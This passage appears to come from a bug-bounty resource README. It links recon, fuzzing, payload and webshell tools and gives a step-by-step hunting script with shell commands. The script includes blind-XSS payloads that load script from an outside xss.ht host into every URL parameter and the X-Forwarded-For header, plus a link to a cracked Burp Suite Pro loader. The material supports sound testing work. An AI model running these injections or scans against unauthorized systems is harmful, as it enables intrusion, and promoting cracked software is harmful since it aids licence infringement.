 - [JSParser](https://github.com/nahamsec/JSParser) - A python 2.7 script using Tornado and JSBeautifier to parse relative URLs from JavaScript files. Useful for easily discovering AJAX requests when performing security research or bug bounty hunting.
 
> Broken link 
- [broken-link-checker](https://github.com/stevenvachon/broken-link-checker) - Find broken links, missing images, etc within your HTML.
- [brokenlinkhijacker](https://github.com/MayankPandey01/BrokenLinkHijacker) - A Fast Broken Link Hijacker Tool written in Python
 
### parameter-finder
- [paramspider](https://github.com/devanshbatham/ParamSpider) - Mining parameters from dark corners of Web Archives 
- [parameth](https://github.com/maK-/parameth) - This tool can be used to brute discover GET and POST parameters
- [param-miner](https://github.com/PortSwigger/param-miner) - This extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities.
- [ParamPamPam](https://github.com/Bo0oM/ParamPamPam) - This tool for brute discover GET and POST parameters.
- [Arjun](https://github.com/s0md3v/Arjun) - HTTP parameter discovery suite.

> Dlelte Duplicate from waybacks
- [dpfilter](https://github.com/Abdulrahman-Kamel/dpfilter) - BugBounty , sort and delete duplicates param value without missing original value 

### bypass-forbidder-directory
 - [dirdar](https://github.com/M4DM0e/DirDar) - DirDar is a tool that searches for (403-Forbidden) directories to break it and get dir listing on it 
 - [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3) - 403/401 Bypass Methods 
 - [byp4xx](https://github.com/lobuhi/byp4xx) - Pyhton script for HTTP 40X responses bypassing. Features: Verb tampering, headers, #bugbountytips tricks and 2454 User-Agents. 
 - [403bypasser](https://github.com/yunemse48/403bypasser) - 403bypasser automates techniques used to bypass access control restrictions on target pages. This tool will continue to be developed, contributions are welcome.


### wordlists-payloads
  - [bruteforce-lists](https://github.com/random-robbie/bruteforce-lists) - Some files for bruteforcing certain things. 
  - [CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries) - The OWASP Cheat Sheet Series was created to provide a concise collection of high value information on specific application security topics. 
  - [Bug-Bounty-Wordlists](https://github.com/Karanxa/Bug-Bounty-Wordlists) - A repository that includes all the important wordlists used while bug hunting. 
  - [seclists](https://github.com/danielmiessler/SecLists) - SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. 
  - [Payload Box](https://github.com/payloadbox) - Attack payloads only 📦
  - [awesome-wordlists](https://github.com/gmelodie/awesome-wordlists) - A curated list wordlists for bruteforcing and fuzzing 
  - [Fuzzing-wordlist](https://gowthams.gitbook.io/bughunter-handbook/fuzzing-wordlists) - fuzzing-wordlists
  - [Web-Attack-Cheat-Sheet](https://github.com/riramar/Web-Attack-Cheat-Sheet) - Web Attack Cheat Sheet
  - [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings) - A list of useful payloads and bypass for Web Application Security and Pentest/CT
  - [pentestmonkey](http://pentestmonkey.net/) - Taking the monkey work out of pentesting

- STOK suggest 
  - [assetnote](https://wordlists.assetnote.io/)
  - [SecUtils](https://github.com/BonJarber/SecUtils) - Random utilities from my security projects that might be useful to others 
  - [jhaddix](https://gist.github.com/jhaddix)


  - [samlists](https://github.com/the-xentropy/samlists)
  - [fuzz](https://github.com/Bo0oM/fuzz.txt)
  - [webshell](https://github.com/tennc/webshell) - This is a webshell open source project
  - [OneListForAll](https://github.com/six2dez/OneListForAll) - Rockyou for web fuzzing 
  

  - [bruteforce-lists](https://github.com/random-robbie/bruteforce-lists) - Some files for bruteforcing certain things.
  - [english-words](https://github.com/dwyl/english-words) - 📝 A text file containing 479k English words for all your dictionary/word-based projects e.g: auto-completion / autosuggestion 

> Exceptional
- [Web-Sec-CheatSheet](https://github.com/imran-parray/Web-Sec-CheatSheet)
- [wordlists](https://github.com/assetnote/wordlists) - Automated & Manual Wordlists provided by Assetnote 
- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb) - Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.
- [WordList](https://github.com/orwagodfather/WordList)
- [Commodity-Injection-Signatures](https://github.com/xsscx/Commodity-Injection-Signatures) - Commodity Injection Signatures, Malicious Inputs, XSS, HTTP Header Injection, XXE, RCE, Javascript, XSLT 

### miscellaneous
  - [hack-tools](https://github.com/edoardottt/lit-bb-hack-tools)
  - [httpmethods](https://github.com/ShutdownRepo/httpmethods) - HTTP verb tampering & methods enumeration 
  - [awesome oscp](https://github.com/0x4D31/awesome-oscp)
  - [maltego](https://www.maltego.com/)
  - [owtf](https://github.com/owtf/owtf)
  - [site broker](https://github.com/Anon-Exploiter/SiteBroker)
  - [explo](https://github.com/telekom-security/explo)
  - [big bounty](https://github.com/Viralmaniar/BigBountyRecon)
  - [awesome bug bounty tools](https://github.com/vavkamil/awesome-bugbounty-tools)
  - [awesome web hacking](https://github.com/infoslack/awesome-web-hacking)
  - [awesome open source](https://awesomeopensource.com/)
  - [cerbrutus](https://github.com/Cerbrutus-BruteForcer/cerbrutus)
  - [radamsa](https://gitlab.com/akihe/radamsa)
  - [reconmaster](https://github.com/YouGina/reconmaster/)
  - [unicode-converter](https://www.branah.com/unicode-converter) - Unicode Converter  Decimal, text, URL, and unicode converter
  - [breport](https://buer.haus/breport/) - Bounty report genarator
  - [hackerone 100 tools](https://www.hackerone.com/ethical-hacker/100-hacking-tools-and-resources) - Hackerone 100 tools for hacker 
  - [Nmap-For-Pentester](https://github.com/Ignitetechnologies/Nmap-For-Pentester) - hunt the vulnerabilties with "Nmap".



### social-engineering
- [social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit) - The Social-Engineer Toolkit (SET) repository from TrustedSec - All new versions of SET will be deployed here. 



> Uncategorized
- [JSONBee](https://github.com/zigoo0/JSONBee) - A ready to use JSONP endpoints/payloads to help bypass content security policy (CSP) of different websites.
- [CyberChef](https://github.com/gchq/CyberChef) - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis
- [bountyplz](https://github.com/fransr/bountyplz) - Automated security reporting from markdown templates (HackerOne and Bugcrowd are currently the platforms supported)
- [awesome-vulnerable-apps](https://github.com/vavkamil/awesome-vulnerable-apps) - Awesome Vulnerable Applications
- [XFFenum](https://github.com/vavkamil/XFFenum) - X-Forwarded-For [403 forbidden] enumeration



### scripts
- [awesome-bughunting-oneliners](https://github.com/devanshbatham/awesome-bughunting-oneliners) - A list of Awesome Bughunting oneliners , collected from the various sources
- [awesome-oneliner-bugbounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty) - A collection of awesome one-liner scripts especially for bug bounty tips.
- [bbtips](https://github.com/punishell/bbtips) - BugBountyTips
- [oneliner-bugbounty](https://github.com/twseptian/oneliner-bugbounty) - oneliner commands for bug bounties
- [One-Liner-Scripts](https://github.com/litt1eb0yy/One-Liner-Scripts) - A collection of awesome one-liner scripts for bug bounty hunting.

------------------------
--------------------
### API_key

- [keyhacks](https://github.com/streaak/keyhacks) - Keyhacks is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid. 
- [gmapsapiscanner](https://github.com/ozguralp/gmapsapiscanner) - Used for determining whether a leaked/found Google Maps API Key is vulnerable to unauthorized access by other applications or not.





----------------------------
------------------------------
### Code_review
- [phpvuln](https://github.com/ecriminal/phpvuln) - 🕸️ Audit tool to find common vulnerabilities in PHP source code 






--------------------------
-----------------------------


### log-file-analyze
- [Dialog](https://github.com/SxNade/DiaLog)

### programs
- [disclose](https://github.com/disclose) -Open-source vulnerability disclosure and bug bounty program database. 
- [bug bounty dork](https://github.com/sushiwushi/bug-bounty-dorks) - List of Google Dorks for sites that have responsible disclosure program / bug bounty program 
- [crunchbase](https://www.crunchbase.com/) - Discover innovative companies and the people behind them
- [bounty-targets-data](https://github.com/arkadiyt/bounty-targets-data) - This repo contains hourly-updated data dumps of bug bounty platform scopes (like Hackerone/Bugcrowd/Intigriti/etc) that are eligible for reports
- [Vdps_are_love](https://github.com/darshanjogi/Vdps_are_love) - This repo is made for those hunters who love to hunt on VDP programs. List of Vdp programs which are not affiliated with known bug bounty platforms such as HackerOne or Bugcrowd.
- [chaos](https://chaos.projectdiscovery.io/#/) - We actively collect and maintain internet-wide assets' data, this project is meant to enhance research and analyse changes around DNS for better insights.
- [bug-bounty-list](https://www.bugcrowd.com/bug-bounty-list/) - The most comprehensive, up to date crowdsourced list of bug bounty and security vulnerability disclosure programs from across the web curated by the hacker community.




### burp-suite-extesion
- [Active scan ++]()
- [Content Type Converter]()
- [Param miner]()
- [Logger ++]()
- [Turbo intruder]()
- [Upload scanner]()
- [Reflected parameters]()
- [Collaborator everywhere]()
- [Backslash powered scanner]()
- [Software version Reporter]()
- [Software vulnerability scanner]()
- [Autorize]()
- [HTTP request smuggler]()
- [Flow]()
- [Hunt]()
- [Burp Bounty]()
- [Taborator]()
- [Add custom header]()
- [command injection attacker]()
- [BurpSuite-Xkeys](https://github.com/vsec7/BurpSuite-Xkeys) - A Burp Suite Extension to extract interesting strings (key, secret, token, or etc.) from a webpage. 
- [Admin-Panel_Finder](https://github.com/moeinfatehi/Admin-Panel_Finder) - A burp suite extension that enumerates infrastructure and application admin interfaces (OTG-CONFIG-005) 
- [x8-Burp](https://github.com/Impact-I/x8-Burp) - Hidden parameters discovery suite
- [burp-extensions](https://github.com/xnl-h4ck3r/burp-extensions) - Burp Extensions 
- [inql](https://github.com/doyensec/inql) - InQL - A Burp Extension for GraphQL Security Testing 





```
    Collaborator Everywhere
    XSS Validator
    Wsdler
    .NET Beautifier
    Bypass WAF
    J2EEScan
    Param Miner
    Wayback Machine
    JS Link Finder
    Upload Scanner
    Nucleus Burp Extension
    Software Vulnerability Scanner
    Active Scan++
```

> Burp suite pro
- [Burp-Suite](https://github.com/SNGWN/Burp-Suite) - || Activate Burp Suite Pro with Loader and Key-Generator || 
> Scope
```bash
^.+\.company\.com$     ^443$   ^/.*
```

### dos
- [slowhttptest](https://github.com/shekyan/slowhttptest) - Application Layer DoS attack simulator


------------------------
--------------------------

### Websocket

- [STEWS](https://github.com/PalindromeLabs/STEWS) - A Security Tool for Enumerating WebSockets 


---------------
--------------------

### hands-on

- Javascript dork manually
```
api
http
https
api_key
apikey
token
secret
config
conf
cfg
ENV
env
```

### Hunting-Script

- 1st Command for Subdomain Enumeration using Assetfinder, Subfinder, Findomain
```bash
assetfinder [].com | tee ./[]-ass && subfinder -silent -all -recursive -d [].com | tee ./[]-sub && findomain -q --external-subdomains -t [].com | tee ./[]-find
```
```bash
python3 domainCollector.py "Org+Inc"
python3 domainCollector.py <orgList>
```
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/[] -u https://[].com -H “Host: FUZZ.[].com” -fs 3122
```


- 2nd Command for Sorting and http probing
```bash
cat DOM-* | sort -u | grep "DOMAIN.com" | tee -a ./unique && rm -rf DOM-* external_subdomains && cat unique | wc -l 
```

- 3rd Commands
```bash
cat unique | httpx -silent | tee -a ./httpx && cat unique | httpx -silent -sc -cl -location -td -server -title | tee -a ./httpx-code && cat httpx | wc -l
```

- 4th Command for dnsgen
```bash
dnsgen unique -w ~/Desktop/dns.txt | httpx -silent | tee -a ./dnsgen
```

- 5th Command for port scanning
```bash
sudo nmap -T4 -A -p- -sS -iL unique | tee -a ./nmap && sudo naabu -silent -list unique | tee -a ./naabu
```

- 6th Command for jaeles and nuclei automation
```bash
cat httpx | nuclei -silent -t ~/nuclei-templates | tee -a ./nuclei 
```
```bash
jaeles scan -c 50 -s <signature> -U <list_urls>
```

- 7th Command for wayback urls and remove duplicate
```bash
cat httpx | gau | tee -a ./gau-1 && cat httpx | gauplus | tee -a ./gau-2 && cat httpx | waybackurls | tee -a ./wayback && cat gau-* wayback | sort -u | tee -a ./finalwaybackurls && rm gau-* wayback && cat finalwaybackurls | wc -l 
```
```bash
cat finalwaybackurls | uro | tee -a ./uro && cat uro | wc -l
```

- 8th Command for find reflected param & XSS
```bash
cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
```
```bash
cat finalwaybackurls | grep "=" | qsreplace https://YOUR.burpcollaborator.net | httpx -silent -sc -cl -location -rt
```
> Blind XSS In Parameters
```bash
cat finalwaybackurls | grep "=" | bxss -appendMode -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -parameters
```
> Blind XSS In X-Forwarded-For Header
```bash
cat finalwaybackurls | bxss -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -header "X-Forwarded-For"
```

> separete js file from waybackurls
```bash
cat finalwaybackurls | subjs | sort -u | tee -a ./subjs
```


- 9th Command for collect all urls
```bash
gospider -S httpx -o gospider -c 10 -d 1 
```

- 10th command for broken link hijacking
```bash
blc http://yoursite.com -ro
```

- 11 th commands for checking open redirection and CRLF check
- [Oralyzer](https://github.com/r0075h3ll/Oralyzer) - Open Redirection Analyzer
```bash
oralyzer -l finalwaybackurls 
```

- 12 commands for directory bruteforce
```bash
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

```
/usr/share/seclists/Discovery/Web-Content/raft-large-extension.txt 
```
```
ffuf -recursion=true -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc -w path -u https://target.com/FUZZ -t 5000
```
```
ffuf -recursion=true -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://target.com/FUZZ -t 1000
```
```
dirsearch -r --full-url -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://target.com -t 70
```

- 13 Censys cli like pro
```bash
censys search ' services.tls.certificates.leaf_data.subject.common_name: "TARGET.com"' --index-type hosts | jq -c '.[] | {ip: .ip}' > censys-ip
```
```bash
sed -i 's/[^0-9,.]*//g' censys-ip
```
```bash
cat censys-ip | httpx -silent -sc -cl -location -td -server -title | tee -a censys-httpx
```
```bash
naabu -iL censys-ip 
```


- 14 Email hunt
```bash
python3 infoga.py -d TARGET.COM -s all -v 3 -i -b -r TARGET.txt
```




































------------------------------------------
--------------------------------------------------
### Smart-Contract
- [mythril](https://github.com/ConsenSys/mythril) - Security analysis tool for EVM bytecode. Supports smart contracts built for Ethereum, Hedera, Quorum, Vechain, Roostock, Tron and other EVM-compatible blockchains. 
















<p align="right">(<a href="#top">back to top</a>)</p>
